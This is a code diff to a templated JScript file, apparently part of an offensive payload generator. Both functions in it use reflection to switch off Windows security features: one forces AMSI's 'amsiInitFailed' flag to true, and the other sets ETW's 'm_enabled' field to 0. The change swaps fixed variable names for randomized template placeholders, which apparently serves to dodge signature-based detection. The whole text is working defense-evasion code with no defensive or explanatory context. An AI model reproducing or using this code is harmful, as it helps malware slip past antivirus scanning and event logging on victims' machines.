@@ -11,20 +11,20 @@
 
     function {{ v.fn_amsi }}() {
         try {
-            var asm  = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-            var amsi = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
-            if (amsi !== null)
-                amsi.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), (4|32)).SetValue(null, true);
+            var {{ v.jsc_lv_aa }}  = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
+            var {{ v.jsc_lv_at }} = {{ v.jsc_lv_aa }}.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
+            if ({{ v.jsc_lv_at }} !== null)
+                {{ v.jsc_lv_at }}.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), (4|32)).SetValue(null, true);
         } catch(e) {}
     }
 
     function {{ v.fn_etw }}() {
         try {
-            var asm = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-            var t   = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
-            if (t !== null) {
-                var fi = t.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), (4|32));
-                if (fi !== null) fi.SetValue(null, 0);
+            var {{ v.jsc_lv_ea }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
+            var {{ v.jsc_lv_et }}   = {{ v.jsc_lv_ea }}.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
+            if ({{ v.jsc_lv_et }} !== null) {
+                var {{ v.jsc_lv_ef }} = {{ v.jsc_lv_et }}.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), (4|32));
+                if ({{ v.jsc_lv_ef }} !== null) {{ v.jsc_lv_ef }}.SetValue(null, 0);
             }
         } catch(e) {}
     }
